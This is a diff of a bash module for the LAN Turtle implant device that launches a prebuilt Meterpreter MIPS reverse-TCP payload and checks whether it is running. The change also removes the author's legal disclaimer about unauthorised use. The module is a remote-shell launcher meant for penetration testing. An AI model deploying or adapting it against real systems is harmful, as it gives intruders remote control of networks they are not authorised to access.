@@ -1,20 +1,18 @@
 #!/bin/bash /usr/lib/turtle/turtle_module
 VERSION="1.0"
 DESCRIPTION="Meterpreter mipsbe reverse tcp"
-AUTHOR="Ag3nt047. *LEGAL DISCLAMER* The author does not hold any responsibility for the bad use of this module, remember that attacking targets without prior consent is illegal and punished by law. So use this module responsibly."
+AUTHOR="Ag3nt047"
 CONF=/tmp/meterpreter-reverse-tcp.form
 
 : ${DIALOG_OK=0}
 : ${DIALOG_CANCEL=1}
 : ${DIALOG_HELP=2}
-: ${DIALOG_EXTRA=3}
-: ${DIALOG_ITEM_HELP=4}
 : ${DIALOG_ESC=255}
 
-function configure {
-  dialog --title "meterpreter-mipsbe-reverse-tcp" --msgbox "\n\
-METERPRETER MIPSBE REVERSE TCP" 9 72
+function status {
+  if ps | grep -w -q [/]etc/turtle/meterpreter/meterpreter-mipsbe; then echo "1"; else echo "0"; fi
 }
+
 
 function start {
   /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp
@@ -25,6 +23,7 @@ function stop {
   echo "meterpreter-mipsbe-reverse-tcp stopped"
 }
 
-function status {
-  if ps | grep -w -q [/]etc/turtle/meterpreter/meterpreter-mipsbe; then echo "1"; else echo "0"; fi
+function configure {
+  dialog --title "meterpreter-mipsbe-reverse-tcp" --msgbox "METERPRETER MIPSBE REVERSE TCP"
 }
+
